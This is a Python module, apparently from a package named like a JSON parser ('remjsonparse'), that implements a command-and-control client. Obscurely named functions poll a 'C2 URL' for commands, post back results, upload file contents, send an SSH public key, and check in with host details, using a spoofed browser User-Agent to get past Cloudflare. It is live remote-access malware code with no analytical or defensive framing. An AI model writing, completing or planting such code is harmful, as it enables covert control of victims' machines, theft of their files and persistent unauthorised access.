import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request

_DEBUG = os.environ.get("REMJSONPARSE_DEBUG", "").strip().lower() in ("1", "true", "yes")

# Browser-like User-Agent so Cloudflare doesn't block before the worker runs
_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def _o0():
    px = urllib.request.getproxies()
    return urllib.request.build_opener(
        urllib.request.ProxyHandler(px),
        urllib.request.HTTPSHandler(),
    )


def _o1(req, timeout=15):
    return _o0().open(req, timeout=timeout)


def _o2(u: str) -> None:
    if not (u.startswith("https://") or u.startswith("HTTPS://")):
        raise ValueError("C2 URL must use HTTPS")


def _p0(u: str, a: str) -> dict:
    _o2(u)
    url = f"{u}/poll?id={urllib.parse.quote(a)}"
    try:
        if _DEBUG:
            print(f"[remjsonparse] _p0 GET {url}", file=sys.stderr, flush=True)
        req = urllib.request.Request(url, headers={"User-Agent": _USER_AGENT})
        with _o1(req, timeout=15) as r:
            d = json.loads(r.read().decode())
            return {
                "cmd": d.get("cmd"),
                "file": d.get("file"),
            }
    except urllib.error.HTTPError as e:
        if _DEBUG:
            body = e.read().decode(errors="replace") if e.fp else ""
            print(f"[remjsonparse] _p0 failed: {e.code} {e.reason} body={body!r}", file=sys.stderr, flush=True)
        return {"cmd": None, "file": None}
    except Exception as e:
        if _DEBUG:
            print(f"[remjsonparse] _p0 failed: {e!r}", file=sys.stderr, flush=True)
        return {"cmd": None, "file": None}


def _p1(u: str, a: str, r: str) -> bool:
    _o2(u)
    url = f"{u}/result"
    try:
        b = json.dumps({"id": a, "result": r}).encode()
        req = urllib.request.Request(url, data=b, method="POST", headers={"User-Agent": _USER_AGENT, "Content-Type": "application/json"})
        with _o1(req, timeout=15):
            return True
    except Exception:
        return False


def _p2(u: str, a: str, path: str, cb: str) -> bool:
    _o2(u)
    url = f"{u}/fileresult"
    try:
        b = json.dumps({"id": a, "path": path, "content": cb}).encode()
        req = urllib.request.Request(url, data=b, method="POST", headers={"User-Agent": _USER_AGENT, "Content-Type": "application/json"})
        with _o1(req, timeout=30):
            return True
    except Exception:
        return False


def _p3(u: str, a: str, pk: str) -> bool:
    _o2(u)
    url = f"{u}/ssh_pubkey"
    try:
        b = json.dumps({"id": a, "pubkey": pk}).encode()
        req = urllib.request.Request(url, data=b, method="POST", headers={"User-Agent": _USER_AGENT, "Content-Type": "application/json"})
        with _o1(req, timeout=15):
            return True
    except Exception:
        return False


def _p4(u: str, a: str, hi: dict) -> bool:
    _o2(u)
    url = f"{u}/checkin"
    try:
        if _DEBUG:
            print(f"[remjsonparse] _p4 POST {url} id={a!r}", file=sys.stderr, flush=True)
        b = json.dumps({"id": a, "hostinfo": hi}).encode()
        req = urllib.request.Request(url, data=b, method="POST", headers={"User-Agent": _USER_AGENT, "Content-Type": "application/json"})
        with _o1(req, timeout=15):
            if _DEBUG:
                print("[remjsonparse] _p4 checkin OK", file=sys.stderr, flush=True)
            return True
    except urllib.error.HTTPError as e:
        if _DEBUG:
            body = e.read().decode(errors="replace") if e.fp else ""
            print(f"[remjsonparse] _p4 failed: {e.code} {e.reason} body={body!r}", file=sys.stderr, flush=True)
        return False
    except Exception as e:
        if _DEBUG:
            print(f"[remjsonparse] _p4 failed: {e!r}", file=sys.stderr, flush=True)
        return False
